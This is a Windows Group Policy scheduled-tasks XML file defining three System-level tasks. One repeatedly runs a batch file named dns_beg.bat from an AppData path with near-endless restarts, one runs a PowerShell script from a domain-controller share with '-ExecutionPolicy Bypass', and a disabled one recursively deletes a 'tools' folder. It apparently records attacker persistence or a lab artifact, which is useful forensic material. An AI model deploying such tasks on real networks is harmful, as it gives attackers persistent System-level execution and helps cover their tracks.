<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}"><TaskV2 clsid="{D8896631-B747-47a7-84A6-C155337F3BC8}" name="delete" image="3" changed="2021-04-10 15:49:55" uid="{71764CDF-B1FC-4BBE-86DD-A6264EE86042}" userContext="0" removePolicy="0" disabled="1"><Properties action="D" name="delete" runAs="NT AUTHORITY\System" logonType="InteractiveToken"><Task version="1.3"><RegistrationInfo><Author>OPS\Administrator</Author><Description></Description></RegistrationInfo><Principals><Principal id="Author"><UserId>NT AUTHORITY\System</UserId><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT5M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>false</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority></Settings><Triggers><RegistrationTrigger><Enabled>true</Enabled></RegistrationTrigger>
				</Triggers><Actions Context="Author"><Exec><Command>powershell.exe</Command><Arguments>-c "remove-item C:\Users\Administrator\AppData\Local\Microsoft\tools\* -recursive"</Arguments></Exec>
				</Actions></Task></Properties></TaskV2>
	<TaskV2 clsid="{D8896631-B747-47a7-84A6-C155337F3BC8}" name="DNS" image="2" changed="2021-04-10 16:34:18" uid="{2970A4B7-9CE0-43FD-8CAB-20A9942F1076}" disabled="0" userContext="0" removePolicy="0"><Properties action="U" name="DNS" runAs="NT AUTHORITY\System" logonType="InteractiveToken"><Task version="1.3"><RegistrationInfo><Author>OPS\Administrator</Author><Description></Description></RegistrationInfo><Principals><Principal id="Author"><UserId>NT AUTHORITY\System</UserId><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT5M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>false</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority><RestartOnFailure><Interval>PT1M</Interval><Count>99999</Count></RestartOnFailure></Settings><Triggers><RegistrationTrigger><Enabled>true</Enabled><Repetition><Interval>PT5M</Interval><StopAtDurationEnd>false</StopAtDurationEnd></Repetition></RegistrationTrigger></Triggers><Actions Context="Author"><Exec><Command>C:\Users\Administrator\AppData\Local\Microsoft\PTD\dns_beg.bat</Command></Exec></Actions></Task></Properties></TaskV2>
	<TaskV2 clsid="{D8896631-B747-47a7-84A6-C155337F3BC8}" name="m" image="2" changed="2021-04-12 19:37:23" uid="{49500BD9-7848-4643-A3A3-A72368508D66}" disabled="0" userContext="0" removePolicy="0"><Properties action="U" name="L" runAs="NT AUTHORITY\System" logonType="S4U"><Task version="1.3"><RegistrationInfo><Author>OPS\Administrator</Author><Description></Description></RegistrationInfo><Principals><Principal id="Author"><UserId>NT AUTHORITY\System</UserId><LogonType>S4U</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT5M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>false</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority></Settings><Triggers><RegistrationTrigger><Enabled>true</Enabled></RegistrationTrigger></Triggers><Actions Context="Author"><Exec><Command>powershell.exe</Command><Arguments>-ExecutionPolicy Bypass -file \\dc1\share\scripts\maso.ps1</Arguments></Exec>
				</Actions></Task></Properties></TaskV2>
</ScheduledTasks>
